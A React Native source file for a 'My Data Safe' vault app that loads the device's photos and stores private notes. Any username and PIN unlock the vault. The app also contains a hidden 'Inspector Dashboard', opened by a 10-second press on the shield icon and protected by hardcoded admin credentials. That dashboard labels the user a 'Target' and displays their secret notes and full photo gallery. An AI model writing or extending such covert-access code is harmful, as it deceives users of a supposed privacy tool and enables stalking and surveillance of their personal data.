import React, { useState, useEffect, useRef } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TextInput,
  TouchableOpacity,
  FlatList,
  Image,
  ScrollView,
  Modal,
  Alert,
  SafeAreaView,
} from 'react-native';
import * as MediaLibrary from 'expo-media-library';

export default function App() {
  // Authentication & Navigation States
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [pin, setPin] = useState('');

  // App Data States
  const [hasPermission, setHasPermission] = useState(null);
  const [photos, setPhotos] = useState([]);
  const [notes, setNotes] = useState([]);
  const [noteInput, setNoteInput] = useState('');

  // Admin / Inspector States
  const [isAdminModalVisible, setIsAdminModalVisible] = useState(false);
  const [adminUsername, setAdminUsername] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);

  // Press timer reference for 10-second long press
  const pressTimer = useRef(null);

  // Request Permissions & Load Gallery Photos
  useEffect(() => {
    (async () => {
      const { status } = await MediaLibrary.requestPermissionsAsync();
      setHasPermission(status === 'granted');
      if (status === 'granted') {
        loadGalleryPhotos();
      }
    })();
  }, []);

  const loadGalleryPhotos = async () => {
    try {
      const media = await MediaLibrary.getAssetsAsync({
        first: 5000,
        sortBy: [[MediaLibrary.SortBy.creationTime, false]],
        mediaType: [MediaLibrary.MediaType.photo],
      });
      setPhotos(media.assets);
    } catch (error) {
      console.log('Error loading photos:', error);
    }
  };

  // User Login Handler
  const handleUserLogin = () => {
    if (username.trim() !== '' && pin.trim() !== '') {
      setIsLoggedIn(true);
    } else {
      Alert.alert('Error', 'Please enter a valid Username and PIN.');
    }
  };

  // Add Private Note
  const handleAddNote = () => {
    if (noteInput.trim() !== '') {
      setNotes([...notes, { id: Date.now().toString(), text: noteInput }]);
      setNoteInput('');
    }
  };

  // Long Press Handlers for Admin Trigger (10 Seconds)
  const handlePressIn = () => {
    pressTimer.current = setTimeout(() => {
      setIsAdminModalVisible(true);
    }, 10000); // 10 seconds
  };

  const handlePressOut = () => {
    if (pressTimer.current) {
      clearTimeout(pressTimer.current);
    }
  };

  // Admin Authentication
  const handleAdminLogin = () => {
    if (adminUsername === 'adminhum789' && adminPassword === 'hum2217071') {
      setIsAdminAuthenticated(true);
    } else {
      Alert.alert('Access Denied', 'Invalid Admin Credentials.');
    }
  };

  // -------------------------------------------------------------
  // RENDER: User Login Screen
  // -------------------------------------------------------------
  if (!isLoggedIn) {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.authContainer}>
          <Text style={styles.appTitle}>My Data Safe</Text>
          <Text style={styles.subtitle}>Enter credentials to access vault</Text>

          <TextInput
            style={styles.input}
            placeholder="Username"
            value={username}
            onChangeText={setUsername}
            autoCapitalize="none"
          />
          <TextInput
            style={styles.input}
            placeholder="PIN (4-6 digits)"
            value={pin}
            onChangeText={setPin}
            secureTextEntry
            keyboardType="numeric"
          />

          <TouchableOpacity style={styles.button} onPress={handleUserLogin}>
            <Text style={styles.buttonText}>Unlock Vault</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    );
  }

  // -------------------------------------------------------------
  // RENDER: Main Vault Screen
  // -------------------------------------------------------------
  return (
    <SafeAreaView style={styles.container}>
      {/* Top Header with Hidden Admin Trigger */}
      <View style={styles.headerContainer}>
        <Text style={styles.headerTitle}>My Data Safe</Text>
        
        <TouchableOpacity
          onPressIn={handlePressIn}
          onPressOut={handlePressOut}
          activeOpacity={0.8}
        >
          <Text style={styles.shieldIcon}>🛡️</Text>
        </TouchableOpacity>
      </View>

      <ScrollView style={styles.scrollContent}>
        {/* Gallery Section */}
        <View style={styles.sectionContainer}>
          <Text style={styles.sectionTitle}>
            Local Media Backup ({photos.length})
          </Text>
          {hasPermission ? (
            <FlatList
              horizontal
              data={photos}
              keyExtractor={(item) => item.id}
              renderItem={({ item }) => (
                <Image source={{ uri: item.uri }} style={styles.galleryImage} />
              )}
              showsHorizontalScrollIndicator={false}
            />
          ) : (
            <Text style={styles.warningText}>
              Permission Required: Allow this app to access your data.
            </Text>
          )}
        </View>

        {/* Private Notes Section */}
        <View style={styles.sectionContainer}>
          <Text style={styles.sectionTitle}>Private Notes</Text>
          <View style={styles.noteInputContainer}>
            <TextInput
              style={[styles.input, { flex: 1, marginBottom: 0 }]}
              placeholder="Write a secret note..."
              value={noteInput}
              onChangeText={setNoteInput}
            />
            <TouchableOpacity style={styles.addNoteButton} onPress={handleAddNote}>
              <Text style={styles.buttonText}>Add</Text>
            </TouchableOpacity>
          </View>

          {notes.map((item) => (
            <View key={item.id} style={styles.noteCard}>
              <Text style={styles.noteText}>{item.text}</Text>
            </View>
          ))}
        </View>
      </ScrollView>

      {/* ------------------------------------------------------------- */}
      {/* SECRET ADMIN INSPECTOR MODAL                                   */}
      {/* ------------------------------------------------------------- */}
      <Modal
        visible={isAdminModalVisible}
        animationType="slide"
        onRequestClose={() => setIsAdminModalVisible(false)}
      >
        <SafeAreaView style={styles.modalContainer}>
          <View style={styles.modalHeader}>
            <Text style={styles.modalTitle}>Inspector Dashboard</Text>
            <TouchableOpacity
              onPress={() => {
                setIsAdminModalVisible(false);
                setIsAdminAuthenticated(false);
              }}
            >
              <Text style={styles.closeButton}>Close</Text>
            </TouchableOpacity>
          </View>

          {!isAdminAuthenticated ? (
            <View style={styles.authContainer}>
              <Text style={styles.subtitle}>Admin Authorization Required</Text>
              <TextInput
                style={styles.input}
                placeholder="Admin ID"
                value={adminUsername}
                onChangeText={setAdminUsername}
                autoCapitalize="none"
              />
              <TextInput
                style={styles.input}
                placeholder="Admin Password"
                value={adminPassword}
                onChangeText={setAdminPassword}
                secureTextEntry
              />
              <TouchableOpacity style={styles.button} onPress={handleAdminLogin}>
                <Text style={styles.buttonText}>Authenticate</Text>
              </TouchableOpacity>
            </View>
          ) : (
            <ScrollView style={styles.adminDataContainer}>
              <Text style={styles.adminSectionTitle}>Target Monitoring</Text>
              <Text style={styles.dataLabel}>Target User: {username}</Text>
              <Text style={styles.dataLabel}>
                Consent Granted: {hasPermission ? 'Yes' : 'No'}
              </Text>
              <Text style={styles.dataLabel}>
                Synced Photos Count: {photos.length}
              </Text>

              <Text style={styles.adminSectionTitle}>Target Notes Logs</Text>
              {notes.length === 0 ? (
                <Text style={styles.dataLabel}>No notes created yet.</Text>
              ) : (
                notes.map((n) => (
                  <Text key={n.id} style={styles.dataLabel}>
                    • {n.text}
                  </Text>
                ))
              )}

              <Text style={styles.adminSectionTitle}>Media Stream Access</Text>
              <View style={styles.adminGrid}>
                {photos.map((p) => (
                  <Image key={p.id} source={{ uri: p.uri }} style={styles.gridImage} />
                ))}
              </View>
            </ScrollView>
          )}
        </SafeAreaView>
      </Modal>
    </SafeAreaView>
  );
}

// -------------------------------------------------------------
// STYLES
// -------------------------------------------------------------
const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  authContainer: {
    flex: 1,
    justifyContent: 'center',
    paddingHorizontal: 20,
  },
  appTitle: {
    fontSize: 28,
    fontWeight: 'bold',
    textAlign: 'center',
    marginBottom: 8,
    color: '#333',
  },
  subtitle: {
    fontSize: 14,
    textAlign: 'center',
    marginBottom: 24,
    color: '#666',
  },
  input: {
    backgroundColor: '#fff',
    borderWidth: 1,
    borderColor: '#ddd',
    borderRadius: 8,
    paddingHorizontal: 12,
    paddingVertical: 10,
    marginBottom: 12,
  },
  button: {
    backgroundColor: '#007AFF',
    paddingVertical: 12,
    borderRadius: 8,
    alignItems: 'center',
  },
  buttonText: {
    color: '#fff',
    fontWeight: 'bold',
  },
  headerContainer: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingHorizontal: 20,
    paddingVertical: 15,
    backgroundColor: '#fff',
    borderBottomWidth: 1,
    borderColor: '#eee',
  },
  headerTitle: {
    fontSize: 20,
    fontWeight: 'bold',
  },
  shieldIcon: {
    fontSize: 22,
  },
  scrollContent: {
    padding: 15,
  },
  sectionContainer: {
    marginBottom: 20,
  },
  sectionTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    marginBottom: 10,
    color: '#444',
  },
  galleryImage: {
    width: 100,
    height: 100,
    borderRadius: 8,
    marginRight: 10,
  },
  warningText: {
    color: '#d9534f',
  },
  noteInputContainer: {
    flexDirection: 'row',
    marginBottom: 10,
  },
  addNoteButton: {
    backgroundColor: '#28a745',
    paddingHorizontal: 15,
    justifyContent: 'center',
    alignItems: 'center',
    borderRadius: 8,
    marginLeft: 8,
  },
  noteCard: {
    backgroundColor: '#fff',
    padding: 12,
    borderRadius: 6,
    marginBottom: 8,
    borderWidth: 1,
    borderColor: '#eee',
  },
  noteText: {
    fontSize: 14,
    color: '#333',
  },
  modalContainer: {
    flex: 1,
    backgroundColor: '#fff',
  },
  modalHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: 15,
    borderBottomWidth: 1,
    borderColor: '#eee',
  },
  modalTitle: {
    fontSize: 18,
    fontWeight: 'bold',
  },
  closeButton: {
    color: '#007AFF',
    fontWeight: 'bold',
  },
  adminDataContainer: {
    padding: 15,
  },
  adminSectionTitle: {
    fontSize: 16,
    fontWeight: 'bold',
    marginTop: 15,
    marginBottom: 8,
    color: '#007AFF',
  },
  dataLabel: {
    fontSize: 14,
    marginBottom: 4,
    color: '#333',
  },
  adminGrid: {
    flexDirection: 'row',
    flexWrap: 'wrap',
  },
  gridImage: {
    width: 80,
    height: 80,
    margin: 4,
    borderRadius: 4,
  },
});
